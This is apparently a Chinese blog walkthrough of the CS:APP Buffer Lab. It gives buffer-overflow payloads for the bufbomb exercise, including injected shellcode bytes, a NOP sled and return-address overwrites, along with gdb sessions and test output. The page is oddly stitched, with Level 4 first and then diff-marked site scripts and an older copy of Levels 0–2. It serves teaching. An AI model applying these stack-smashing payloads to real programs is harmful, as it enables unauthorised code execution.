class="line">ret</span><br></pre></td></tr></table></figure><p>生成对应的字节码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -m32 4_code.s</span><br><span class="line">objdump -d 4_code.o &gt; 4_code.d</span><br><span class="line">cat 4_code.d</span><br><span class="line"></span><br><span class="line">4_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   8d 6c 24 28             lea    0x28(%esp),%ebp</span><br><span class="line">   4:   68 94 33 e6 56          push   $0x56e63394</span><br><span class="line">   9:   58                      pop    %eax</span><br><span class="line">   a:   68 3a 8e 04 08          push   $0x8048e3a</span><br><span class="line">   f:   c3                      ret</span><br></pre></td></tr></table></figure><p>我们把这个攻击代码放在何处？我们又如何定位到该代码呢？</p><p>由于使用了随机化策略，因此我们还是不能够通过gdb调试的方式直接获取该字符串的地址。</p><p>但是实际上如果在我们的攻击代码前面插入大量的nop指令，只要我们跳转过程中来到了nop区域，最终一定可以通过不断执行“nop”指令”滑到“我们的攻击代码处。</p><p>因此我们可以从getbufn函数中的buf指向的内存开始，插入大量的nop指令，然后我们利用缓冲区漏洞，将返回地址指向这一片区域，为了使得我们命中这片区域的概率最大，我们可以将返回地址修改为buf字符串的”中间区域“，即<code>buf+len(buf)/2</code>。</p><p>我们先利用gdb大致看一下getbufn中buf字符串的大致位置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb bufbomb</span><br><span class="line">b getbufn</span><br><span class="line">run -u yalexin -n</span><br><span class="line">n</span><br><span class="line">n</span><br><span class="line">   0x8049215 &lt;getbufn+9&gt;            lea    eax, [ebp - 0x208]</span><br><span class="line">   0x804921b &lt;getbufn+15&gt;           mov    dword ptr [esp], eax</span><br><span class="line"> ► 0x804921e &lt;getbufn+18&gt;           call   Gets                     &lt;Gets&gt;</span><br><span class="line">        arg[0]: 0x556834b8 (_reserved+1037496) ◂— 0x0</span><br><span class="line">        arg[1]: 0x0</span><br><span class="line">        arg[2]: 0x0</span><br><span class="line">        arg[3]: 0x0</span><br><span class="line"> </span><br><span class="line">   0x8049223 &lt;getbufn+23&gt;           mov    eax, 1</span><br><span class="line">   0x8049228 &lt;getbufn+28&gt;           leave  </span><br><span class="line">   0x8049229 &lt;getbufn+29&gt;           ret    </span><br><span class="line"> </span><br><span class="line">   0x804922a                        nop    </span><br><span class="line">   0x804922b                        nop    </span><br><span class="line">   0x804922c &lt;initialize_bomb&gt;      push   ebp</span><br><span class="line">   0x804922d &lt;initialize_bomb+1&gt;    mov    ebp, esp</span><br><span class="line">   0x804922f &lt;initialize_bomb+3&gt;    push   esi</span><br></pre></td></tr></table></figure><p>从控制台中我们可以发现，此时的buf地址为0x556834b8，我们再加上256，变为0x556835b8，作为<code>getbufn</code>的返回地址，我们就有机会遇上我们的攻击代码！</p><p>因此最终的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 &#x2F;* 前面是大量的nop指令  *&#x2F;</span><br><span class="line">8d 6c 24 28 68 94 33 e6 &#x2F;* 攻击代码  *&#x2F;</span><br><span class="line">56 58 68 3a 8e 04 08 c3	</span><br><span class="line">00 00 00 00				&#x2F;* 暂时修改ebp *&#x2F;</span><br><span class="line">b8 35 68 55				&#x2F;* 给一个大致的地址，使得我们能够定位到nop *&#x2F;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat 4.txt | .&#x2F;hex2raw -n | .&#x2F;bufbomb -n -u yalexin </span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></div><div class="reward-container"><div>假如对您有所帮助，那就请我喝咖啡吧~~</div> <button onclick='var qr=document.getElementById("qr");qr.style.display="none"===qr.style.display?"block":"none"'> 打赏</button><div id="qr" style="display:none"><div style="display:inline-block"> <img src="/images/WeChat.png" alt="YaleXin 微信支付"><p>微信支付</p></div><div style="display:inline-block"> <img src="/images/Alipay.jpg" alt="YaleXin 支付宝"><p>支付宝</p></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E6%B1%87%E7%BC%96/" rel="tag"><i class="fa fa-tag"></i> 汇编</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2023/09/30/docker-compose%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%EF%BC%88nginx-MySQL-Nuxt-Java%EF%BC%89/" rel="prev" title="docker-compose博客系统（nginx+MySQL+Nuxt+Java）"><i class="fa fa-chevron-left"></i> docker-compose博客系统（nginx+MySQL+Nuxt+Java）</a></div><div class="post-nav-item"> <a href="/2023/10/02/CS-APP-Architecture-Lab/" rel="next" title="CS:APP-Architecture Lab">CS:APP-Architecture Lab<i class="fa fa-chevron-right"></i></a></div></div></footer></article><div><div><div style="text-align:center;color:#ccc;font-size:14px">------ 文章结束------</div></div></div></div></div><script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> 文章目录</li><li class="sidebar-nav-overview"> 站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-0-Candle"><span class="nav-number">1.</span> <span class="nav-text">Level 0: Candle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1-Sparkler"><span class="nav-number">2.</span> <span class="nav-text">Level 1: Sparkler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2-Firecracker"><span class="nav-number">3.</span> <span class="nav-text">Level 2: Firecracker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3-Dynamite"><span class="nav-number">4.</span> <span class="nav-text">Level 3: Dynamite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-4-Nitroglycerin"><span class="nav-number">5.</span> <span class="nav-text">Level 4: Nitroglycerin</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="YaleXin" src="/uploads/cat_mouse.jpg"><p class="site-author-name" itemprop="name">YaleXin</p><div class="site-description" itemprop="description">学渣一枚</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">127</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/"><span class="site-state-item-count">13</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/"><span class="site-state-item-count">120</span> <span class="site-state-item-name">标签</span></a></div></nav></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; 2020 – <span itemprop="copyrightYear">2024</span><span class="with-love"><i class="fa fa-fas fa-heartbeat"></i></span> <span class="author" itemprop="copyrightHolder">YaleXin</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span title="站点总字数">523k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span title="站点阅读时长">7:56</span></div> <span>本站已在此等候您 <span id="dnum" style="color:#35b8ff">0</span> 天</span> <span><span id="hnum" style="color:#35b8ff">0</span> 小时 <span id="mnum" style="color:#35b8ff">0</span> 分 <span id="snum" style="color:#35b8ff">0</span> 秒</span><script>var now=new Date;function createtime(){var n=new Date("02/21/2020 11:30:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("dnum").innerHTML=dnum,document.getElementById("hnum").innerHTML=hnum,document.getElementById("mnum").innerHTML=mnum,document.getElementById("snum").innerHTML=snum}setInterval("createtime()",250)</script><div class="powered-by"> <span>powered by</span> <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i></span> <span class="site-uv" title="总访客量"><span>总访客量：</span><span id="busuanzi_value_site_uv"></span></span></span> <span class="post-meta-divider">|</span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="site-pv" title="总访问量"><span>总访问量：</span><span id="busuanzi_value_site_pv"></span></span></span></div><script>
+  function leancloudSelector(url) {
+    url = encodeURI(url);
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.getAttribute('id'));
+      var title = visitors.getAttribute('data-flag-title');
 
-  
-  
-  
-  <meta property="og:title" content="CS:APP-Buffer Lab - 黄阿信" />
-  
-  <meta property="og:type" content="article" />
-  
-  <meta property="og:url" content="https://yalexin.gitee.io/2023/10/01/CS-APP-Buffer-Lab/index.html" />
-  
-  <meta property="og:image" content="/favicon.png" />
-  
-  <meta property="og:article:published_time" content="2023-10-01T06:45:23.000Z" />
-  
-  <meta property="og:article:author" content="YaleXin" />
-  
-  
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.error('Failed to create', error);
+                });
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.getAttribute('id'));
+      });
 
-  
-<link rel="stylesheet" href="/css/var.css">
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (let item of results) {
+            let { url, time } = item;
+            leancloudSelector(url).innerText = time;
+          }
+          for (let url of entries) {
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+  }
 
-  
-<link rel="stylesheet" href="/css/main.css">
-
-  
-<link rel="stylesheet" href="/css/typography.css">
-
-  
-<link rel="stylesheet" href="/css/code-highlighting.css">
-
-  
-<link rel="stylesheet" href="/css/components.css">
-
-  
-<link rel="stylesheet" href="/css/nav.css">
-
-  
-<link rel="stylesheet" href="/css/paginator.css">
-
-  
-<link rel="stylesheet" href="/css/footer.css">
-
-  
-<link rel="stylesheet" href="/css/post-list.css">
-
-  
-  
-<link rel="stylesheet" href="/css/rainbow-banner.css">
-
-  
-  
-  
-<link rel="stylesheet" href="/css/toc.css">
-
-  
-  
-  
-  
-  
-<link rel="stylesheet" href="/css/post.css">
-
-  
-  
-  
-  
-  
-
-  
-</head>
-    <body
-        data-color-scheme="auto"
-        data-uppercase-categories="true"
-        
-        data-rainbow-banner="true"
-        data-rainbow-banner-shown="auto"
-        data-rainbow-banner-month="6"
-        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
-        
-        data-config-root="/"
-        
-        data-toc="true"
-        data-toc-max-depth="2"
-        
-        
-    >
-        <nav id="theme-nav">
-    <div class="inner">
-        <a class="title" href="/">Blog</a>
-        <div class="nav-arrow"></div>
-        <div class="nav-items">
-            <a class="nav-item nav-item-home" href="/">Home</a>
-            
-            
-            <a class="nav-item" href="/archives">Archives</a>
-            
-            
-            
-            <a class="nav-item" href="/friends">Friends</a>
-            
-            
-            
-            <a class="nav-item" href="/projects">Projects</a>
-            
-            
-            
-            <a class="nav-item" href="/about">About</a>
-            
-            
-            
-            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
-            
-            
-        </div>
-    </div>
-</nav>
-        
-<article class="post">
-    <div class="meta">
-        
-        <div class="categories text-uppercase">
-        
-            <a href="/categories/教程/">教程</a>
-        
-        </div>
-        
-
-        
-        <div class="date" id="date">
-            <span>October</span>
-            <span>1,</span>
-            <span>2023</span>
-        </div>
-        
-
-        <h1 class="title">CS:APP-Buffer Lab</h1>
-    </div>
-
-    <div class="divider"></div>
-
-    <div class="content">
-        <p><em>CS:APP2e</em>上面的32位旧实验，现已被<em>Attack Lab</em>实验替代。</p>
-<p>老规矩，先反汇编</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.s</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>注意</strong>： IA-32体系下，过程调用传参与x86-64有些区别，具体需要结合汇编代码进行分析</p>
-</blockquote>
-<p>生成cookie</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./makecookie yalexin</span></span><br><span class="line">0x56e63394</span><br></pre></td></tr></table></figure>
-
-<h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>本关卡需要我们利用缓冲区溢出，控制程序走到<code>smoke</code>函数<a id="more"></a></p>
-<p>相关汇编如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">080491f4 &lt;getbuf&gt;:</span><br><span class="line"> ; 注意，栈中还保留了ebp</span><br><span class="line"> 80491f4:	55                   	push   %ebp</span><br><span class="line"> 80491f5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80491f7:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> ; buf字符串地址距离栈底0x28个字节</span><br><span class="line"> 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 80491fd:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8049200:	e8 f5 fa ff ff       	call   8048cfa &lt;Gets&gt;</span><br><span class="line"> 8049205:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804920a:	c9                   	leave</span><br><span class="line"> 804920b:	c3                   	ret</span><br></pre></td></tr></table></figure>
-
-<p>综上，我们输入字符串时候，应输入0x28个字符，然后再输入4个字符，把ebp覆盖，才可以输入我们的返回地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 0.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 18 8c 04 08 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 0.txt | ./bufbomb -u yalexin  </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
-
-<h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>在这以关卡中，我们要调用<code>fizz</code>函数，同时要传入一个变量，下面是<code>fizz</code>函数的部分代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08048c42 &lt;fizz&gt;:</span><br><span class="line"> 8048c42:	55                   	push   %ebp</span><br><span class="line"> 8048c43:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c45:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> ; 通过观察，我们可以知道fizz的参数val是通过堆栈的方式传递</span><br><span class="line"> ; 加8是因为要跳过返回地址</span><br><span class="line"> 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax</span><br></pre></td></tr></table></figure>
-
-<p>因此我们要在栈上放入我们的cookie：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 1.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 42 8c 04 08 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br><span class="line">42 8c 04 08 94 33 e6 56 &#x2F;* 前4个作为调用fix后的返回地址，我们可以随便设置，后4个是函数参数，即我们的cookie *&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 1.txt | ./bufbomb -u yalexin    </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Fizz!: You called fizz(0x56e63394)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
-
-<h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>这一关卡我们要设置全局变量，同时调用bang的时候要传入一个参数，我们先通过gdb查看<code>getbuf</code>函数中字符串<code>buf</code>的地址：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb bufbomb </span><br><span class="line">b getbuf</span><br><span class="line">r -u yalexin    </span><br><span class="line">b</span><br><span class="line">b</span><br><span class="line">EAX  0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7e1f094 (randtbl+20) ◂— 0xe017ddb9</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x1</span><br><span class="line"> ESI  0x556865c0 ◂— 0x0</span><br><span class="line"> EBP  0x556836c0 (_reserved+1038016) —▸ 0x556836f0 (_reserved+1038064) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd3b8 —▸ 0xffffd3f8 ◂— ...</span><br><span class="line"> ESP  0x55683688 (_reserved+1037960) —▸ 0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line">*EIP  0x8049200 (getbuf+12) —▸ 0xfffaf5e8 ◂— 0xfffaf5e8</span><br><span 